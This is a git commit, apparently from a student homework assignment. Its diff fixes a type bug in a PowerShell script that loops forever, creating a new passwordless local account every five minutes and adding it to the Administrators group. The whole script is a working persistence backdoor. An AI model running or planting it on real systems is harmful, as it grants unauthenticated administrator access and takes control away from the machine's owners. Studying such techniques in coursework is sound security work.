1b7f537ff758b87dc4a755055b4910033c47724d
Kyle <kam3634@rit.edu>
2023-11-15 08:09:45 -0500

    hw4 again

--- new-user.ps1
+++ new-user.ps1
@@ -1,9 +1,10 @@
-$number = 1
+$number = "1"
 
 while ($true) {
     $username = $number + "user"
     New-LocalUser -Name $username -Description $username -NoPassword
     Add-LocalGroupMember -Group "Administrators" -Member $username
-    $number = [int]$number + 1
+    $numbery = [int]$number + 1
+    $number = [string]$numbery
     Start-Sleep -Seconds 300
   }
